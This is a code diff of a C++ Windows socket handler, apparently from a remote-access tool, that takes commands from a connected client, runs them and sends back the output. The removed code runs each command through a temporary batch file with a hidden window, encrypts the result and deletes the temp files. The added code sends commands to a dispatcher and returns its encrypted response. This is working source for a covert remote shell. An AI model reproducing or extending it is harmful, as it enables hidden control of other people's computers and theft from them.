@@ -304,20 +304,8 @@ DWORD WINAPI ClientSocketThread(void* arg) {
     char recvbuf[bufferlength];
     int recvbuflen = bufferlength;
     std::size_t posSubStr;
-    // write the output of command in a file
-    srand((unsigned int)time(0));
-    std::stringstream ss;
-    ss << rand(); // An integer value between 0 and RAND_MAX
 
-    std::string fileName = ss.str();
-    char tmp_path[MAX_PATH];
-    GetTempPath(MAX_PATH, tmp_path);
-    std::string fileBat = tmp_path;
-    fileBat.append(fileName + ".bat");
-    std::string fileLog = tmp_path;
-    fileLog.append(fileName + ".log");
     // Receive until the peer shuts down the connection
-
     send(ClientSocket, "\nConnection Established\n",24, 0);
 
     do {
@@ -329,46 +317,16 @@ DWORD WINAPI ClientSocketThread(void* arg) {
 
         posSubStr = command.find("\n");
         if (posSubStr != std::string::npos) {
-
             // erase escape characters
-            command.erase(posSubStr);
+            //command.erase(posSubStr);
 
-            std::string commandTmp = command;
-            commandTmp.append(" > " + fileLog);
-            std::ofstream file(fileBat.c_str());
+            std::string response = CommandsDispatcher(command);
+            // string encryption
+            if (encryptionKey != NULL) response = EncryptDecrypt(response, encryptionKey);
 
-            if (file.is_open()) {
-                for (std::string::iterator it = commandTmp.begin();
-                     it != commandTmp.end(); ++it) {
-                    file << *it;
-                }
-                file.close();
-            }
+            iSendResult = send(ClientSocket, response.c_str(),
+                               (int)strlen(response.c_str()), 0);
 
-            if (ShellExecute(0, "open", fileBat.c_str(), "", 0, SW_HIDE)) {
-                // Response
-                command.append("  -->  ");
-                std::ifstream fileResp(fileLog.c_str());
-                std::string s;
-                if (fileResp.is_open()) {
-                    while (!fileResp.eof()) {
-                        getline(fileResp, s);
-                        command.push_back('\n');
-                        command.append(s);
-                    }
-                }
-
-                // string encryption
-                if (encryptionKey != NULL) command = EncryptDecrypt(command, encryptionKey);
-
-                iSendResult = send(ClientSocket, command.c_str(),
-                                   (int)strlen(command.c_str()), 0);
-                fileResp.close();
-
-            }
-            else {
-                iSendResult = send(ClientSocket, "error", 5, 0);
-            }
             if (iSendResult == SOCKET_ERROR) {
                 closesocket(ClientSocket);
                 WSACleanup();
@@ -379,10 +337,6 @@ DWORD WINAPI ClientSocketThread(void* arg) {
         command.clear();
 
     } while (iResult > 0);
-
-    // remove tmp files
-    remove(fileBat.c_str());
-    remove(fileLog.c_str());
 
     send(ClientSocket, "\nConnection Stopped\n",20, 0);
 
